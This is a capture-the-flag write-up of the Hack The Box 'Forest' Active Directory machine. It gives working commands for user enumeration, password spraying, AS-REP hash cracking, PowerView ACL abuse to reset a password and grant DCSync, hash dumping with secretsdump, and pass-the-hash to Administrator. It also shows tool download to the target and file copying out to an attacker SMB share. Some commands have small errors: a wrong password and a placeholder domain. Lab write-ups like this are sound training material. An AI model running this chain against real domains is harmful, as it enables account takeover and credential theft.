OS: Windows
Tags: Active Directory, ACL Abuse
### Port Discovery 
```
sudo nmap 10.10.10.161 -p- -vv -n -Pn -T4

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49686/tcp open  unknown          syn-ack ttl 127
49708/tcp open  unknown          syn-ack ttl 127
49976/tcp open  unknown          syn-ack ttl 127
```
Enumerate more to get service info
```
nmap 10.10.10.161 -p53,88,135,139,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49678,49679,49686,48708,49976 -vv -n -Pn -sC -sV

PORT      STATE  SERVICE      REASON          VERSION
53/tcp    open   domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open   kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-22 14:55:32Z)
135/tcp   open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open   netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open   kpasswd5?    syn-ack ttl 127
593/tcp   open   ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped   syn-ack ttl 127
3268/tcp  open   ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped   syn-ack ttl 127
5985/tcp  open   http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open   mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open   http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
48708/tcp closed unknown      reset ttl 127
49664/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open   ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49686/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49976/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 51816/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44587/udp): CLEAN (Timeout)
|   Check 4 (port 23521/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-06-22T14:56:23
|_  start_date: 2025-06-22T13:20:55
|_clock-skew: mean: 2h04m35s, deviation: 4h02m32s, median: -15m26s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-06-22T07:56:25-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

```

in \etc\host file add this in: 
```
10.10.10.161 htb.local forest.htb.local
```
note the domain for the accounts in the format HTB\username

## DNS Enumeration
```
dig @10.10.10.161 htb.local TXT        

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.10.161 htb.local TXT
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 40974
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: 33e095093314fa24 (echoed)
;; QUESTION SECTION:
;htb.local.                     IN      TXT

;; AUTHORITY SECTION:
htb.local.              3600    IN      SOA     forest.htb.local. hostmaster.htb.local. 106 900 600 86400 3600

;; Query time: 7 msec
;; SERVER: 10.10.10.161#53(10.10.10.161) (UDP)
;; WHEN: Sun Jun 22 23:17:42 +08 2025
;; MSG SIZE  rcvd: 104
```
Found another sub-domain `hostmaster.htb.local`

Tried `dig axfr @10.10.10.161 htb.local`, `dig axfr @10.10.10.161 forest.htb.local` and `dig axfr @10.10.10.161 hostmaster.htb.local` but nothing found

So nothing in DNS as of now

## SMB Enumeration
```
smbclient -N -L \\10.10.10.161\
```
anonymous login was successful but nothing from the SMB Server

rpc into it
```
rpcclient -U'%' 10.10.10.161
```
then `enumdomains` returns
```
name:[HTB] idx:[0x0]
name:[Builtin] idx:[0x0]
```
`enumdomusers` returns
```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[cyril] rid:[0x2582]
```
`enumdomgroup` returns
```
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```
other commands like netshareenumall and querydominfo did not work

## AD Enumeration
Password Enumeration
```
enum4linux-ng -P 10.10.10.161 -oA ilfreight
```

![](../Assets/Screenshot%202025-06-22%20at%2011.45.26%20PM.png)

Putting all the users we found above into a file called `user.list`
```
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
cyril
```

and then modifying the rockyou.txt into a rule that it is minimally 7 characters
```
cp /usr/share/wordlists/rockyou.txt ./rockyou.txt
grep -E '.{7,}' rockyou.txt > modrockyou.txt
```

### password spraying
```
crackmapexec smb 10.10.10.161 -u user.list -p modrockyou.txt | grep +
```
this took too long so i decided to do more enumeration while it ran

## LDAP Enumeration
```
enum4linux 10.10.10.161 | egrep "Account|Domain|Lockout|group"
```
other than the information that we got above we got some information about the domain computers
```
Group: 'Domain Computers' (RID: 515) has member: HTB\EXCH01$
Group: 'Domain Computers' (RID: 515) has member: HTB\cyril$
Group: 'Domain Controllers' (RID: 516) has member: HTB\FOREST$
```

We can also get more information about group permissions and group permissions through
```
ldapsearch -x -H ldap://10.10.10.161 -D '' -w '' -b "DC=htb,DC=local"
```

And then we can use kerbrute to find more infromation about that users we have in our userlist
```
kerbrute userenum -d htb.local --dc 10.10.10.161 user.list
```
we get 
```
2025/06/23 11:32:26 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ddbd84fdef842095d214f3d2d58083c6$6c906b032834c9a5b56f2c7823b1a64dafb9abe6fea4ddd4a2cecf47a86830b8446d4939b0596c1db1cab6c5b896a6a21dd9fdb8b61dc068020f33cecf87d3861c12321feb8a1386adcc2a2497bbe408ba4cd902baf826e9732ea3150acf5c3e854c8a700e8a462509f814f96ae9d9ec554edab2bd67ffddaab25934548c6e294501346cadf0e4389830928ad175cb73732e4e7df4877e32019728810eec72c7d238b0a13c98b3a63b4a61904f61b5e3c55aa5c22f00f027df113602db79866d7db582259ad2b2946ba10f20cd8791b371c858052385860d559ce9e03d3146291391e8d5fd68
```
put the whole hash from `$krb5asrep....8d5fd68` into a file 

We can crack it with hashcat
```
hashcat -m 18200 hash.txt /usr/share/wordlist/rockyou.txt
```

We get the password for "svc-alfresco" is "s3rvice"
![](../Assets/Screenshot%202025-06-23%20at%2011.51.03%20AM.png)

Note: if the hashcat doesn't work, request for a krb ticket again by executing the kerbrute command or use `impacket-GetNPUsers`

## Gaining a foothold
we can try to log in as svc-alfresco into winrm
```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

then move to the Desktop directory of svc-alfresco and get the flag(note: you can't use relative paths in evil-winrm so you got to use full paths)
```
type C:\Users\svc-alfresco\Desktop\user.txt
```

![](../Assets/Screenshot%202025-06-23%20at%2011.57.29%20AM.png)

### Enumeration Again...
transfer SharpHound from our attack host to the ip address

Note: I actually spent a lot of time trying out different versions of sharphound (both exe and ps scripts) because most of it weren't working on the forest machine. 
#### FileTransfer
download SharpHound.ps1 on our attack host first https://github.com/SpecterOps/BloodHound-Legacy/tree/master) and then start a HTTP Server in the directory where the executable is 
```
python3 -m http.server
```
and then back on the winrm we download the file
```
(New-Object Net.WebClient).DownloadFile('http://<ip-address-of-your-machine>:8000/SharpHound.exe','C:\Users\svc-alfresco\Desktop\SharpHound.exe')
```
SharpHound.exe didn't work very well so i did the same but with SharpHound.ps1

in evil-winrm
```
.\SharpHound -c All --LdapUsername svc-alfresco --LdapPassword s3rvice --ZipFileName htb.zip
```

NOw we need to transfer the zipfile back

start a smb server on our attack host
```
mkdir /tmp/fakeshare
chmod 777 /tmp/fakeshare
sudo impacket-smbserver -smb2support fakeshare /tmp/fakeshare
```
then transfer the zip file from the windows machine
```
copy 20250622235801_HTB.zip \\<your-htb-ip-address>\fakeshare\
```

### Bloodhound
Now open up bloodhound, ensure all the data from previous other times are deleted first. Then upload the data, let bloodhound ingest it.

First, search `svc-alfresco` and then right click on the node, and then click on `Add to owned`
![](../Assets/Screenshot%202025-06-23%20at%203.33.30%20PM.png)

Next navigate to the CYPHER page, there click on the folder icon, that will lead you to Pre-built Search. Search for `Shortest Path to Domain Admin`, then click on `Run`
![](../Assets/Screenshot%202025-06-23%20at%203.36.40%20PM.png)

Now in the nodes, we can see our possible attack chain.
![](../Assets/Screenshot%202025-06-23%20at%203.38.36%20PM.png)
svc-alfresco owns cyril, which is a member of exchange windows permission that has writedacl to htb.local which contains users which then contains domain admins which contains administrator

## Getting to Cyril
If you right click on the relationship between svc-alfresco and cyril (the one with `owns`) written on it, a side bar will show up

![](../Assets/Screenshot%202025-06-23%20at%203.42.45%20PM.png)

Then you can click on windows abuse to learn how to abuse it

Most form of abuse will require powerview so we can transfer powerview.ps1 like how we transfered sharphound just now

I tried to do set the domain object in order to give svc-alfresco GenericALL writes to cyril
```
$SecPassword = ConvertTo-SecureString 's3cure' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity svc-alfresco -Rights All
```
then after that once i got cyril's password reseted 
```
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity cyril -AccountPassword $UserPassword -Credential $Cred
```

i attempt to grant cyril permission to do DCSync using PowerView again
```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\cyril', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```
and then i do a DCSync from my linux attack host 
```
impacket-secretsdump HTB/cyril:'Password123!'@10.10.10.161
```
i get a lot of hashes
![](../Assets/Screenshot%202025-06-24%20at%2012.23.23%20AM.png)
So i take the Administrator's NT hash `32693b11e6aa90eb43d32c72a07ceea6`
and then i pass the hash through evil-winrm
```
evil-winrm -i 10.10.10.161 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```
then i navigate to `C:\Users\Administrator\Desktop` and then `cat root.txt`

![](../Assets/Screenshot%202025-06-24%20at%2012.25.47%20AM.png)

Yay we pwned the machine!
